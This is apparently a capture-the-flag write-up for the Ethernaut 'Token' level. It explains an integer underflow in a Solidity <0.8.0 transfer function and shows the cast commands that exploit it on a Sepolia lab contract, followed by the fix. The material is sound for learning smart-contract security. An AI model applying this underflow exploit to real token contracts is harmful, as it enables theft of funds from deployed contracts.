# Ethernaut Challenge 05 — Token

This challenge demonstrates how integer underflow in Solidity `< 0.8.0` can be exploited to create a massive token balance.

The goal of the level is to end up with more than the 20 tokens initially assigned to our address.

Instance address:

```
0xB4ceb3270C4cE2De83DA503235ad214FD4D75357
```

---

## 🎯 Goal

The challenge is solved when our balance becomes greater than the initial 20 tokens.

In practice, the exploit allows us to obtain a huge amount of tokens through an underflow.

---

## 🧠 Thought process

The vulnerable logic is inside the `transfer()` function:

```solidity
function transfer(address _to, uint256 _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
}
```

At first glance, the `require` statement looks like it is checking that the sender has enough tokens:

```solidity
require(balances[msg.sender] - _value >= 0);
```

However, this check is flawed.

In Solidity `< 0.8.0`, arithmetic is not checked automatically.  
This means that if `balances[msg.sender] < _value`, the subtraction does not revert. Instead, it underflows and wraps around to a very large `uint256` value.

For example, if my balance is:

```
20
```

and I try to transfer:

```
21
```

then:

```
20 - 21
```

does not become `-1`, because `uint256` cannot represent negative values.

Instead, it wraps around to:

```
2^256 - 1
```

So the `require` becomes:

```solidity
require(2^256 - 1 >= 0);
```

which is always true.

That means the contract allows the transfer, even though the sender does not actually have enough tokens.

The result is:

- the sender balance underflows to a huge number
- the receiver still receives the requested amount
- the attacker ends up with an enormous token balance

---

## 🧪 Step 1 — Inspect the contract onchain

Before exploiting the contract, I checked the token supply and the relevant balances on Sepolia.

Check the total supply:

```bash
cast call 0xB4ceb3270C4cE2De83DA503235ad214FD4D75357 \
    "totalSupply()" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
0x0000000000000000000000000000000000000000000000000000000001406f40
```

Convert to decimal:

```bash
cast --to-dec 0x0000000000000000000000000000000000000000000000000000000001406f40
```

Result:

```
21000000
```

This is the total token supply.

My address:

```
0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0
```

Check my balance:

```bash
cast call 0xB4ceb3270C4cE2De83DA503235ad214FD4D75357 \
    "balanceOf(address)" 0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0 \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
0x0000000000000000000000000000000000000000000000000000000000000014
```

Convert to decimal:

```bash
cast --to-dec 0x0000000000000000000000000000000000000000000000000000000000000014
```

Result:

```
20
```

So my address starts with 20 tokens.

Check the token balance of the contract itself:

```bash
cast call 0xB4ceb3270C4cE2De83DA503235ad214FD4D75357 \
    "balanceOf(address)" 0xB4ceb3270C4cE2De83DA503235ad214FD4D75357 \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
0x0000000000000000000000000000000000000000000000000000000000000000
```

The token contract itself holds 0 tokens.

Check the balance of the contract creator:

```
0x478f3476358Eb166Cb7adE4666d04fbdDB56C407
```

```bash
cast call 0xB4ceb3270C4cE2De83DA503235ad214FD4D75357 \
    "balanceOf(address)" 0x478f3476358Eb166Cb7adE4666d04fbdDB56C407 \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
0x0000000000000000000000000000000000000000000000000000000001406f2c
```

Convert to decimal:

```bash
cast --to-dec 0x0000000000000000000000000000000000000000000000000000000001406f2c
```

Result:

```
20999980
```

This matches the expected setup:

- total supply: `21000000`
- creator balance: `20999980`
- my balance: `20`

---

## 🧪 Step 2 — Reproduce the bug locally

Before exploiting the contract on Sepolia, I recreated the same situation locally in:

```text
test/TokenTest.sol
```

In that test, I reproduced the Ethernaut setup and documented how the underflow happens when an address with 20 tokens attempts to transfer 21.

Run the test with:

```bash
forge test --mc TokenTest
```

This confirmed that the vulnerability is exploitable in Solidity `0.6.0`.

---

## 🚀 Step 3 — Execute the exploit on Sepolia

To trigger the underflow, I sent 21 tokens even though my address only owned 20.

I chose the token contract itself as the receiver address. Since the contract had a zero token balance, this makes the exploit easy to observe.

```bash
cast send 0xB4ceb3270C4cE2De83DA503235ad214FD4D75357 \
    "transfer(address,uint256)" 0xB4ceb3270C4cE2De83DA503235ad214FD4D75357 21 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Transaction hash:

```
0x0ff6d358a9d638994880a09982d1f94c1305878e1221f0ed69f64990360ded5e
```

Because my balance was only 20, the subtraction underflowed and wrapped around to `2^256 - 1`.

---

## ✅ Step 4 — Verify the result

Check my balance again:

```bash
cast call 0xB4ceb3270C4cE2De83DA503235ad214FD4D75357 \
    "balanceOf(address)" 0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0 \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
```

Convert to decimal:

```bash
cast --to-dec 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
```

Result:

```
115792089237316195423570985008687907853269984665640564039457584007913129639935
```

This is:

```
2^256 - 1
```

So the exploit worked successfully and the challenge was completed.

---

## 🛡️ Security takeaway

This challenge highlights a classic integer underflow bug in older Solidity versions.

Key lessons:

- in Solidity `< 0.8.0`, arithmetic does not revert automatically on underflow or overflow
- checks like `balances[msg.sender] - _value >= 0` are unsafe for unsigned integers
- the correct validation should be performed before subtraction:

```solidity
require(balances[msg.sender] >= _value);
```

- in Solidity `>= 0.8.0`, this type of underflow would automatically revert

This is a good example of why arithmetic safety is critical in token contracts.